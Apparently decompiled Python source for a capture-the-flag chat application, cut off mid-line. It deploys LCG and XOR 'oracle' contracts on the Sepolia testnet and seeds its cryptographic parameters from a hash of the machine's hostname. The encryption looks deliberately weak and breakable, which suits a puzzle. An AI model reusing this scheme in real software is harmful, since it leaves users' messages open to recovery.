<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> scrolledtext, messagebox, simpledialog, Checkbutton, BooleanVar, Toplevel</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes, isPrime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> eth_account <span class="keyword">import</span> Account</span><br><span class="line"><span class="keyword">from</span> eth_account.signers.local <span class="keyword">import</span> LocalAccount</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resource_path</span>(<span class="params">relative_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;\n    Get the absolute path to a resource, which works for both development\n    and for a PyInstaller-bundled executable.\n    &quot;&quot;&quot;</span>  <span class="comment"># inserted</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        base_path = sys._MEIPASS</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        base_path = os.path.abspath(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> os.path.join(base_path, relative_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SmartContracts</span>:</span><br><span class="line">    rpc_url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    private_key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">deploy_contract</span>(<span class="params">contract_bytes, contract_abi</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            w3 = Web3(Web3.HTTPProvider(SmartContracts.rpc_url))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> w3.is_connected():</span><br><span class="line">                <span class="keyword">raise</span> ConnectionError(<span class="string">f&#x27;[!] Failed to connect to Ethereum network at <span class="subst">&#123;SmartContracts.rpc_url&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+] Connected to Sepolia network at <span class="subst">&#123;SmartContracts.rpc_url&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+] Current block number: <span class="subst">&#123;w3.eth.block_number&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> SmartContracts.private_key:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Please add your private key.&#x27;</span>)</span><br><span class="line">            account = Account.from_key(SmartContracts.private_key)</span><br><span class="line">            w3.eth.default_account = account.address</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+] Using account: <span class="subst">&#123;account.address&#125;</span>&#x27;</span>)</span><br><span class="line">            balance_wei = w3.eth.get_balance(account.address)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Account balance: <span class="subst">&#123;w3.from_wei(balance_wei, <span class="string">&#x27;ether&#x27;</span>)&#125;</span> ETH&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> balance_wei == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[!] Warning: Account has 0 ETH. Deployment will likely fail. Get some testnet ETH from a faucet (e.g., sepoliafaucet.com)!&#x27;</span>)</span><br><span class="line">            Contract = w3.eth.contract(abi=contract_abi, bytecode=contract_bytes)</span><br><span class="line">            gas_estimate = Contract.constructor().estimate_gas()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+] Estimated gas for deployment: <span class="subst">&#123;gas_estimate&#125;</span>&#x27;</span>)</span><br><span class="line">            gas_price = w3.eth.gas_price</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Current gas price: <span class="subst">&#123;w3.from_wei(gas_price, <span class="string">&#x27;gwei&#x27;</span>)&#125;</span> Gwei&quot;</span>)</span><br><span class="line">            transaction = Contract.constructor().build_transaction(&#123;<span class="string">&#x27;from&#x27;</span>: account.address, <span class="string">&#x27;nonce&#x27;</span>: w3.eth.get_transaction_count(account.address), <span class="string">&#x27;gas&#x27;</span>: gas_estimate + <span class="number">200000</span>, <span class="string">&#x27;gasPrice&#x27;</span>: gas_price&#125;)</span><br><span class="line">            signed_txn = w3.eth.account.sign_transaction(transaction, private_key=SmartContracts.private_key)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+]  Deploying contract...&#x27;</span>)</span><br><span class="line">            tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+] Deployment transaction sent. Hash: <span class="subst">&#123;tx_hash.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] Waiting for transaction to be mined...&#x27;</span>)</span><br><span class="line">            tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=<span class="number">300</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+] Transaction receipt: <span class="subst">&#123;tx_receipt&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> tx_receipt.status == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[!] Transaction failed (status 0). It was reverted.&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            contract_address = tx_receipt.contractAddress</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+] Contract deployed at address: <span class="subst">&#123;contract_address&#125;</span>&#x27;</span>)</span><br><span class="line">            deployed_contract = w3.eth.contract(address=contract_address, abi=contract_abi)</span><br><span class="line">            <span class="keyword">return</span> deployed_contract</span><br><span class="line">        <span class="keyword">except</span> ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[!] Connection error: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Please check your RPC_URL and network connection.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[!] Configuration error: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[!] An unexpected error occurred: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCGOracle</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, multiplier, increment, modulus, initial_seed</span>):</span><br><span class="line">        <span class="variable language_">self</span>.multiplier = multiplier</span><br><span class="line">        <span class="variable language_">self</span>.increment = increment</span><br><span class="line">        <span class="variable language_">self</span>.modulus = modulus</span><br><span class="line">        <span class="variable language_">self</span>.state = initial_seed</span><br><span class="line">        <span class="variable language_">self</span>.contract_bytes = <span class="string">&#x27;6080604052348015600e575f5ffd5b506102e28061001c5f395ff3fe608060405234801561000f575f5ffd5b5060043610610029575f3560e01c8063115218341461002d575b5f5ffd5b6100476004803603810190610042919061010c565b61005d565b6040516100549190610192565b60405180910390f35b5f5f848061006e5761006d6101ab565b5b86868061007e5761007d6101ab565b5b8987090890505f5f8411610092575f610095565b60015b60ff16905081816100a69190610205565b858260016100b49190610246565b6100be9190610205565b6100c89190610279565b9250505095945050505050565b5f5ffd5b5f819050919050565b6100eb816100d9565b81146100f5575f5ffd5b50565b5f81359050610106816100e2565b92915050565b5f5f5f5f5f60a08688031215610125576101246100d5565b5b5f610132888289016100f8565b9550506020610143888289016100f8565b9450506040610154888289016100f8565b9350506060610165888289016100f8565b9250506080610176888289016100f8565b9150509295509295909350565b61018c816100d9565b82525050565b5f6020820190506101a55f830184610183565b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f61020f826100d9565b915061021a836100d9565b9250828202610228816100d9565b9150828204841483151761023f5761023e6101d8565b5b5092915050565b5f610250826100d9565b915061025b836100d9565b9250828203905081811115610273576102726101d8565b5b92915050565b5f610283826100d9565b915061028e836100d9565b92508282019050808211156102a6576102a56101d8565b5b9291505056fea2646970667358221220c7e885c1633ad951a2d8168f80d36858af279d8b5fe2e19cf79eac15ecb9fdd364736f6c634300081e0033&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.contract_abi = [&#123;<span class="string">&#x27;inputs&#x27;</span>: [&#123;<span class="string">&#x27;internalType&#x27;</span>: <span class="string">&#x27;uint256&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;LCG_MULTIPLIER&#x27;</span>, <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;uint256&#x27;</span>&#125;, &#123;<span class="string">&#x27;internalType&#x27;</span>: <span class="string">&#x27;uint256&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;LCG_INCREMENT&#x27;</span>, <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;uint256&#x27;</span>&#125;, &#123;<span class="string">&#x27;internalType&#x27;</span>: <span class="string">&#x27;uint256&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;LCG_MODULUS&#x27;</span>, <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;uint256&#x27;</span>&#125;, &#123;<span class="string">&#x27;internalType&#x27;</span>: <span class="string">&#x27;uint256&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;_currentState&#x27;</span>, <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;uint256&#x27;</span>&#125;, &#123;<span class="string">&#x27;internalType&#x27;</span>: <span class="string">&#x27;uint256&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;_counter&#x27;</span>, <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;uint256&#x27;</span>&#125;], <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;nextVal&#x27;</span>, <span class="string">&#x27;outputs&#x27;</span>: [&#123;<span class="string">&#x27;internalType&#x27;</span>: <span class="string">&#x27;uint256&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;uint256&#x27;</span>&#125;], <span class="string">&#x27;stateMutability&#x27;</span>: <span class="string">&#x27;pure&#x27;</span>, <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;function&#x27;</span>&#125;]</span><br><span class="line">        <span class="variable language_">self</span>.deployed_contract = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">deploy_lcg_contract</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.deployed_contract = SmartContracts.deploy_contract(<span class="variable language_">self</span>.contract_bytes, <span class="variable language_">self</span>.contract_abi)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_next</span>(<span class="params">self, counter</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;\n[+] Calling nextVal() with _currentState=<span class="subst">&#123;self.state&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.state = <span class="variable language_">self</span>.deployed_contract.functions.nextVal(<span class="variable language_">self</span>.multiplier, <span class="variable language_">self</span>.increment, <span class="variable language_">self</span>.modulus, <span class="variable language_">self</span>.state, counter).call()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;  _counter = <span class="subst">&#123;counter&#125;</span>: Result = <span class="subst">&#123;self.state&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.state</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TripleXOROracle</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.contract_bytes = <span class="string">&#x27;61030f61004d600b8282823980515f1a6073146041577f4e487b71000000000000000000000000000000000000000000000000000000005f525f60045260245ffd5b305f52607381538281f3fe7300000000000000000000000000000000000000003014608060405260043610610034575f3560e01c80636230075614610038575b5f5ffd5b610052600480360381019061004d919061023c565b610068565b60405161005f91906102c0565b60405180910390f35b5f5f845f1b90505f845f1b90505f61007f85610092565b9050818382181893505050509392505050565b5f5f8290506020815111156100ae5780515f525f5191506100b6565b602081015191505b50919050565b5f604051905090565b5f5ffd5b5f5ffd5b5f819050919050565b6100df816100cd565b81146100e9575f5ffd5b50565b5f813590506100fa816100d6565b92915050565b5f5ffd5b5f5ffd5b5f601f19601f8301169050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b61014e82610108565b810181811067ffffffffffffffff8211171561016d5761016c610118565b5b80604052505050565b5f61017f6100bc565b905061018b8282610145565b919050565b5f67ffffffffffffffff8211156101aa576101a9610118565b5b6101b382610108565b9050602081019050919050565b828183375f83830152505050565b5f6101e06101db84610190565b610176565b9050828152602081018484840111156101fc576101fb610104565b5b6102078482856101c0565b509392505050565b5f82601f83011261022357610222610100565b5b81356102338482602086016101ce565b91505092915050565b5f5f5f60608486031215610253576102526100c5565b5b5f610260868287016100ec565b9350506020610271868287016100ec565b925050604084013567ffffffffffffffff811115610292576102916100c9565b5b61029e8682870161020f565b9150509250925092565b5f819050919050565b6102ba816102a8565b82525050565b5f6020820190506102d35f8301846102b1565b9291505056fea26469706673582212203fc7e6cc4bf6a86689f458c2d70c565e7c776de95b401008e58ca499ace9ecb864736f6c634300081e0033&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.contract_abi = [&#123;<span class="string">&#x27;inputs&#x27;</span>: [&#123;<span class="string">&#x27;internalType&#x27;</span>: <span class="string">&#x27;uint256&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;_primeFromLcg&#x27;</span>, <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;uint256&#x27;</span>&#125;, &#123;<span class="string">&#x27;internalType&#x27;</span>: <span class="string">&#x27;uint256&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;_conversationTime&#x27;</span>, <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;uint256&#x27;</span>&#125;, &#123;<span class="string">&#x27;internalType&#x27;</span>: <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;_plaintext&#x27;</span>, <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;string&#x27;</span>&#125;], <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;encrypt&#x27;</span>, <span class="string">&#x27;outputs&#x27;</span>: [&#123;<span class="string">&#x27;internalType&#x27;</span>: <span class="string">&#x27;bytes32&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;bytes32&#x27;</span>&#125;], <span class="string">&#x27;stateMutability&#x27;</span>: <span class="string">&#x27;pure&#x27;</span>, <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;function&#x27;</span>&#125;]</span><br><span class="line">        <span class="variable language_">self</span>.deployed_contract = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">deploy_triple_xor_contract</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.deployed_contract = SmartContracts.deploy_contract(<span class="variable language_">self</span>.contract_bytes, <span class="variable language_">self</span>.contract_abi)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, prime_from_lcg, conversation_time, plaintext_bytes</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;\n[+] Calling encrypt() with prime_from_lcg=<span class="subst">&#123;prime_from_lcg&#125;</span>, time=<span class="subst">&#123;conversation_time&#125;</span>, plaintext=<span class="subst">&#123;plaintext_bytes&#125;</span>&#x27;</span>)</span><br><span class="line">        ciphertext = <span class="variable language_">self</span>.deployed_contract.functions.encrypt(prime_from_lcg, conversation_time, plaintext_bytes).call()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;  _ciphertext = <span class="subst">&#123;ciphertext.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChatLogic</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.lcg_oracle = <span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.xor_oracle = <span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.rsa_key = <span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.seed_hash = <span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.super_safe_mode = <span class="literal">False</span></span><br><span class="line">        <span class="variable language_">self</span>.message_count = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.conversation_start_time = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.chat_history = []</span><br><span class="line">        <span class="variable language_">self</span>._initialize_crypto_backend()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_system_artifact_hash</span>(<span class="params">self</span>):</span><br><span class="line">        artifact = platform.node().encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        hash_val = hashlib.sha256(artifact).digest()</span><br><span class="line">        seed_hash = <span class="built_in">int</span>.from_bytes(hash_val, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[SETUP]  - Generated Seed <span class="subst">&#123;seed_hash&#125;</span>...&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> seed_hash</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_generate_primes_from_hash</span>(<span class="params">self, seed_hash</span>):</span><br><span class="line">        primes = []</span><br><span class="line">        current_hash_byte_length = (seed_hash.bit_length() + <span class="number">7</span>) // <span class="number">8</span></span><br><span class="line">        current_hash = seed_hash.to_bytes(current_hash_byte_length, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[SETUP] Generating LCG parameters from system artifact...&#x27;</span>)</span><br><span class="line">        iteration_limit = <span class="number">10000</span></span><br><span class="line">        iterations = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(primes) &lt; <span class="number">3</span> <span class="keyword">and</span> iterations &lt; iteration_limit:</span><br><span class="line">            current_hash = hashlib.sha256(current_hash).digest()</span><br><span class="line">            candidate = <span class="built_in">int</span>.from_bytes(current_hash, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">            iterations += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> candidate.bit_length() == <span class="number">256</span> <span class="keyword">and</span> isPrime(candidate):</span><br><span class="line">                primes.append(candidate)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[SETUP]  - Found parameter <span class="subst">&#123;<span class="built_in">len</span>(primes)&#125;</span>: <span class="subst">&#123;<span class="built_in">str</span>(candidate)[:<span class="number">20</span>]&#125;</span>...&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(primes) &lt; <span class="number">3</span>:</span><br><span class="line">            error_msg = <span class="string">&#x27;[!] Error: Could not find 3 primes within iteration limit.&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Current Primes: &#x27;</span>, primes)</span><br><span class="line">            <span class="built_in">print</span>(error_msg)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">return</span> (primes[<span class="number">0</span>], primes[<span class="number">1</span>], primes[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_initialize_crypto_backend</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.seed_hash = <span class="variable language_">self</span>._get_system_artifact_hash()</span><br><span class="line">        m, c, n = <span class="variable language_">self</span>._generate_primes_from_hash(<span class="variable 